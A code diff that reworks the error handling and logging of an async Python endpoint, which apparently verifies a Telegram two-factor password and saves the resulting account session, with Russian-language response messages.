@@ -258,20 +258,27 @@ async def verify_password(request):
             return json_response(False, "Сессия истекла. Начните заново.")
 
         client = auth["client"]
-        try:
-            await client.check_password(password)
-            me = await client.get_me()
-            await save_account(auth, me.username)
-            await client.disconnect()
-            del pending_auths[auth_id]
-            return json_response(True, "Аккаунт успешно добавлен")
-        except Exception as e:
-            print("verify_password error:", str(e))
-            await client.disconnect()
-            return json_response(False, f"Ошибка 2FA: {str(e)}")
+
+        print(f"🔐 Проверка 2FA пароля для {auth['phone']}")
+
+        await client.check_password(password)
+        
+        me = await client.get_me()
+        await save_account(auth, me.username)
+        await client.disconnect()
+        del pending_auths[auth_id]
+
+        print(f"✅ 2FA успешно пройден для {auth['phone']}")
+        return json_response(True, "Аккаунт успешно добавлен")
+
     except Exception as e:
-        print("verify_password server error:", str(e))
-        return json_response(False, "Ошибка сервера")
+        print("❌ verify_password ERROR:", str(e))
+        try:
+            if 'client' in locals():
+                await client.disconnect()
+        except:
+            pass
+        return json_response(False, f"Ошибка 2FA: {str(e)}")
 
 async def save_account(auth, tg_username):
     try:
